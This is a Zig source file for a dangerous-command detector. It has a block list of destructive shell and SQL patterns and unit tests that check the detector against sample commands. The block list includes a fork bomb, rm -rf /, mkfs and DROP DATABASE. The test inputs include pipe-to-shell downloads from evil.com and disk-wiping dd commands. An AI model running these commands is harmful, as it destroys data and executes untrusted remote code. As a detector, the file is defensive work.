const std = @import("std");

pub const DangerousPattern = struct {
    pattern: []const u8,
    description: []const u8,
    severity: enum { low, medium, high, critical },
};

pub const dangerous_patterns = [_]DangerousPattern{
    .{ .pattern = "rm -rf /", .description = "delete root directory", .severity = .critical },
    .{ .pattern = "rm -rf /*", .description = "delete root directory", .severity = .critical },
    .{ .pattern = "rm -r /", .description = "recursive delete from root", .severity = .critical },
    .{ .pattern = "rm --recursive /", .description = "recursive delete from root", .severity = .critical },
    .{ .pattern = "chmod 777", .description = "chmod 777 permissions", .severity = .high },
    .{ .pattern = "chmod 666", .description = "chmod 666 permissions", .severity = .high },
    .{ .pattern = "chmod -R 777", .description = "recursive chmod 777", .severity = .high },
    .{ .pattern = "DROP TABLE", .description = "SQL DROP TABLE", .severity = .high },
    .{ .pattern = "DROP DATABASE", .description = "SQL DROP DATABASE", .severity = .critical },
    .{ .pattern = "DELETE FROM", .description = "SQL DELETE", .severity = .high },
    .{ .pattern = "TRUNCATE TABLE", .description = "SQL TRUNCATE", .severity = .high },
    .{ .pattern = "mkfs", .description = "format filesystem", .severity = .critical },
    .{ .pattern = "dd if=", .description = "disk copy operation", .severity = .critical },
    .{ .pattern = "> /dev/sd", .description = "write to block device", .severity = .critical },
    .{ .pattern = ":(){ :|:& };:", .description = "fork bomb", .severity = .critical },
    .{ .pattern = "curl | sh", .description = "pipe remote to shell", .severity = .critical },
    .{ .pattern = "wget | sh", .description = "pipe remote to shell", .severity = .critical },
    .{ .pattern = "| sh", .description = "pipe to shell", .severity = .critical },
    .{ .pattern = "| zsh", .description = "pipe to shell", .severity = .critical },
    .{ .pattern = "| bash", .description = "pipe to shell", .severity = .critical },
    .{ .pattern = "bash -c", .description = "shell -c execution", .severity = .medium },
    .{ .pattern = "sh -c", .description = "shell -c execution", .severity = .medium },
    .{ .pattern = "kill -9 -1", .description = "kill all processes", .severity = .high },
    .{ .pattern = "pkill -9", .description = "force kill processes", .severity = .medium },
    .{ .pattern = "sed -i", .description = "sed in-place edit", .severity = .medium },
    .{ .pattern = "> /etc/", .description = "overwrite system config", .severity = .high },
    .{ .pattern = "chown -R root", .description = "recursive chown to root", .severity = .high },
    .{ .pattern = "systemctl stop", .description = "stop system service", .severity = .high },
    .{ .pattern = "systemctl disable", .description = "disable system service", .severity = .high },
};

pub fn checkDangerousCommand(command: []const u8) ?DangerousPattern {
    for (dangerous_patterns) |p| {
        if (containsLower(command, p.pattern)) {
            return p;
        }
    }
    return null;
}

fn containsLower(haystack: []const u8, needle: []const u8) bool {
    if (needle.len > haystack.len) return false;

    var i: usize = 0;
    while (i <= haystack.len - needle.len) : (i += 1) {
        var j: usize = 0;
        while (j < needle.len) : (j += 1) {
            const h = std.ascii.toLower(haystack[i + j]);
            const n = std.ascii.toLower(needle[j]);
            if (h != n) break;
            if (j == needle.len - 1) return true;
        }
    }
    return false;
}

test "checkDangerousCommand detects rm -rf" {
    try std.testing.expect(checkDangerousCommand("rm -rf /") != null);
    try std.testing.expect(checkDangerousCommand("rm -rf /*") != null);
    try std.testing.expect(checkDangerousCommand("RM -RF /home") != null);
}

test "checkDangerousCommand detects fork bomb" {
    try std.testing.expect(checkDangerousCommand(":(){ :|:& };:") != null);
}

test "checkDangerousCommand detects mkfs" {
    try std.testing.expect(checkDangerousCommand("mkfs.ext4 /dev/sda") != null);
}

test "checkDangerousCommand detects dd disk write" {
    try std.testing.expect(checkDangerousCommand("dd if=/dev/zero of=/dev/sda") != null);
}

test "checkDangerousCommand detects chmod 777" {
    try std.testing.expect(checkDangerousCommand("chmod 777 file.txt") != null);
    try std.testing.expect(checkDangerousCommand("CHMOD 777 secret") != null);
}

test "checkDangerousCommand detects DROP DATABASE" {
    try std.testing.expect(checkDangerousCommand("DROP DATABASE production") != null);
    try std.testing.expect(checkDangerousCommand("drop database users") != null);
}

test "checkDangerousCommand detects SQL DELETE" {
    try std.testing.expect(checkDangerousCommand("DELETE FROM users WHERE 1=1") != null);
}

test "checkDangerousCommand detects TRUNCATE" {
    try std.testing.expect(checkDangerousCommand("TRUNCATE TABLE sessions") != null);
}

test "checkDangerousCommand detects pipe to shell" {
    try std.testing.expect(checkDangerousCommand("curl https://evil.com/script.sh | sh") != null);
    try std.testing.expect(checkDangerousCommand("wget -q -O- https://evil.com/script.sh | sh") != null);
}

test "checkDangerousCommand detects shell -c" {
    try std.testing.expect(checkDangerousCommand("bash -c 'rm -rf /'") != null);
    try std.testing.expect(checkDangerousCommand("sh -c 'format c:'") != null);
}

test "checkDangerousCommand detects kill all" {
    try std.testing.expect(checkDangerousCommand("kill -9 -1") != null);
}

test "checkDangerousCommand detects pkill" {
    try std.testing.expect(checkDangerousCommand("pkill -9") != null);
}

test "checkDangerousCommand detects sed -i" {
    try std.testing.expect(checkDangerousCommand("sed -i 's/foo/bar/g' file.txt") != null);
}

test "checkDangerousCommand detects write to /etc" {
    try std.testing.expect(checkDangerousCommand("echo 'evil' > /etc/passwd") != null);
}

test "checkDangerousCommand detects block device write" {
    try std.testing.expect(checkDangerousCommand("cat image.iso > /dev/sda") != null);
}

test "checkDangerousCommand detects systemctl" {
    try std.testing.expect(checkDangerousCommand("systemctl stop firewalld") != null);
    try std.testing.expect(checkDangerousCommand("systemctl disable sshd") != null);
}

test "checkDangerousCommand detects chown to root" {
    try std.testing.expect(checkDangerousCommand("chown -R root:root /home") != null);
}

test "checkDangerousCommand allows safe commands" {
    try std.testing.expect(checkDangerousCommand("ls -la") == null);
    try std.testing.expect(checkDangerousCommand("git status") == null);
    try std.testing.expect(checkDangerousCommand("cat file.txt") == null);
    try std.testing.expect(checkDangerousCommand("echo hello") == null);
    try std.testing.expect(checkDangerousCommand("mkdir -p src/utils") == null);
}

test "checkDangerousCommand handles empty input" {
    try std.testing.expect(checkDangerousCommand("") == null);
}

test "checkDangerousCommand is case insensitive" {
    try std.testing.expect(checkDangerousCommand("RM -RF /") != null);
    try std.testing.expect(checkDangerousCommand("MkFs /Dev/Sda") != null);
    try std.testing.expect(checkDangerousCommand("BaSh -c 'echo hi'") != null);
}
